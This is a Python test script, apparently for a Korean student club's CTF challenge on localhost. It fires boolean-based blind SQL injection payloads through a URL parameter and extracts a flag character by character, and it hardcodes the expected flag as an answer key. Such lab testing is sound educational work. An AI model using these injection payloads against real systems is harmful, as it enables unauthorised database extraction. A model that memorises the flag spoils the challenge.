#!/usr/bin/env python3
import requests
from urllib.parse import quote

def test_whois_ctf():
    """WHOIS CTF URL 파라미터 테스트"""
    url = "http://localhost:8080"
    
    print("🛡️ WHOIS 동아리 게시판 CTF 테스트")
    print("="*50)
    
    # 알려진 플래그: CTF{WH01S_bl1nd_URL_1nj3ct10n_m4st3r}
    test_flag = "CTF{WH01S_bl1nd_URL_1nj3ct10n_m4st3r}"
    
    print("📝 Boolean-based 블라인드 SQL 인젝션 테스트")
    print("-" * 40)
    
    # 기본 테스트
    tests = [
        ("정상 사용자", "admin", True),
        ("존재하지 않는 사용자", "nonexistent", False),
        ("SQL True 테스트", "admin' AND 1=1-- ", True),
        ("SQL False 테스트", "admin' AND 1=2-- ", False),
        ("테이블 존재 확인", "admin' AND (SELECT COUNT(*) FROM flags)>0-- ", True),
        ("플래그 개수 확인", "admin' AND (SELECT COUNT(*) FROM flags)=2-- ", True),
    ]
    
    for desc, payload, expected in tests:
        response = requests.get(f"{url}?user={quote(payload)}")
        has_posts = "post-card" in response.text
        
        status = "✅" if has_posts == expected else "❌"
        result = "게시글 있음" if has_posts else "게시글 없음"
        
        print(f"{status} {desc:<20} | {result}")
    
    print("\n🔍 플래그 문자별 추출 테스트")
    print("-" * 40)
    
    # 플래그 문자별 테스트 (처음 10글자)
    for i, expected_char in enumerate(test_flag[:10], 1):
        payload = f"admin' AND ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1),{i},1))={ord(expected_char)}-- "
        response = requests.get(f"{url}?user={quote(payload)}")
        has_posts = "post-card" in response.text
        
        status = "✅" if has_posts else "❌"
        print(f"{status} Position {i:2d}: '{expected_char}' (ASCII {ord(expected_char)})")
    
    print(f"\n🎯 예상 플래그: {test_flag}")
    
    print("\n🌐 수동 테스트 URL 예시:")
    print(f"   {url}?user=admin%27%20AND%201%3D1--%20")
    print(f"   {url}?user=admin%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20flags%29%3E0--%20")
    
    print("\n💡 자동 솔버 실행:")
    print("   python3 solver.py http://localhost:8080")

if __name__ == "__main__":
    test_whois_ctf()